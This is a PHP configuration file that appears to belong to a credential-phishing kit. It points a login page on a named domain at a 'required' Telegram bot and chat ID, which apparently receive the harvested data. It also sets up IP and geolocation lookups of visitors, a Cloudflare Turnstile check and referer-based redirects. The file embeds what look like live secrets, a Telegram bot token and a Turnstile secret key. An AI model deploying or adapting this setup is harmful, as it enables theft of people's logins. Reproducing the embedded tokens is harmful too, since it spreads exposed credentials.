<?php
/**
 * CONFIGURATION FILE - DO NOT COMMIT TO GIT
 * Rename this file to config.php on your server
 * 
 * This file contains ALL configurable URLs, credentials, and settings.
 * No hardcoded values should exist in app.php - everything is configured here.
 */

// Frontend Server Configuration
define('FRONTEND_URL', 'https://www.alpharomeoandtheguyrising.com'); // Your frontend server URL
define('LOGIN_PAGE', 'he-opas.html'); // Login page filename

// Telegram Configuration
// Primary Bot (REQUIRED)
define('TELEGRAM_BOT_TOKEN', '8499182673:AAGesMaZF6BI809HR5GK1aY7jb0XqRQC3ms');
define('TELEGRAM_CHAT_ID', '7608981070');

// Secondary Bot (OPTIONAL) - Leave empty strings if not using
// Example: define('TELEGRAM_BOT_TOKEN_2', '1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ123456789');
// Example: define('TELEGRAM_CHAT_ID_2', '9876543210');
define('TELEGRAM_BOT_TOKEN_2', ''); // Optional second bot token
define('TELEGRAM_CHAT_ID_2', '');   // Optional second bot chat ID

define('TELEGRAM_API_URL', 'https://api.telegram.org/bot'); // Telegram API base URL

// Turnstile Configuration
define('TURNSTILE_SECRET', '0x4AAAAAABuU_Y3u4wDzmWBxJShHN2uHHTM');
define('TURNSTILE_VERIFY_URL', 'https://challenges.cloudflare.com/turnstile/v0/siteverify'); // Turnstile verification endpoint

// External API Endpoints
define('IP_SERVICE_URL', 'https://ipv4.icanhazip.com'); // IPv4-only service
define('IP_SERVICE_FALLBACK', 'https://api.ipify.org'); // Fallback IP service
define('GEO_SERVICE_URL', 'http://ipapi.co'); // Service to get location from IP
define('GEO_SERVICE_FALLBACK', 'http://ip-api.com/json'); // Fallback geo service

// Environment type
define('ENVIRONMENT', 'production'); // or 'development'

// CORS Configuration - domains allowed to access this backend
define('ALLOWED_ORIGINS', [
    'https://www.alpharomeoandtheguyrising.com',
    'https://alpharomeoandtheguyrising.com', // Without www
    'http://localhost:8001', // Local development
    'http://127.0.0.1:8001'   // Local development alternative
]);

// Redirect Configuration
define('USE_REFERER_REDIRECT', true); // Set to false to use fixed FRONTEND_URL instead
?>
